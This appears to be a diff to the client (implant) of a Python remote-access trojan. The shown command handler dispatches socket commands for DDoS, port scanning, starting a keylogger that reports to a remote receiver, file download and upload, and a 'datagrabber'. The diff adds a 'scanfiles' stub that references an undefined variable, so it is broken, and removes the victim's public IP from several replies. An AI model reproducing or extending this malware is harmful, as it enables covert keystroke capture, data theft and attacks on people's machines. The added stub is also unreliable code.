@@ -2133,6 +2133,13 @@ class Client():
 
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))	
 
+            elif "scanfiles" in data:
+                try:
+                    data = data.replace("scanfiles ","").split()
+                    # Scan pc for files
+                    self.sock.send(str.encode(f"Scan Complete !\n\n{resulsts}"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
             elif "ddos" in data:
                 try:
                     data=data.replace("ddos ","").split()
@@ -2237,7 +2244,7 @@ class Client():
 
                         return run_scanner(thread_amount, starting_port, ending_port)
                     
-                    self.sock.send(str.encode(f"{self.public_ip}    {ipp}  Open ports are: {_portscanner(ipp, starting_port, ending_port, thread_amount)}"))
+                    self.sock.send(str.encode(f"{ipp}  Open ports are: {_portscanner(ipp, starting_port, ending_port, thread_amount)}"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "admincheck" in data:
@@ -2251,7 +2258,7 @@ class Client():
                     reciever = str(data[1])
 
                     threading.Thread(target=Keylogger(intervals, reciever).start).start()
-                    self.sock.send(str.encode(f"{self.public_ip}    Keylogger started"))
+                    self.sock.send(str.encode(f"Keylogger started"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "download" in data:
@@ -2259,7 +2266,7 @@ class Client():
                     data = data.replace("download ","").split()
                     dir = str(data[0])
                     out = self.download(dir)
-                    self.sock.send(str.encode(f"{self.public_ip}    Download file: " + out))
+                    self.sock.send(str.encode(f"Download file: " + out))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "upload" in data:
@@ -2267,7 +2274,7 @@ class Client():
                     data = data.replace("upload ","").split()
                     dir = str(data[0])
                     out = self.upload(dir)
-                    self.sock.send(str.encode(f"{self.public_ip}    " + out))
+                    self.sock.send(str.encode(f"File Uploaded: " + out))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "datagrabber" in data:
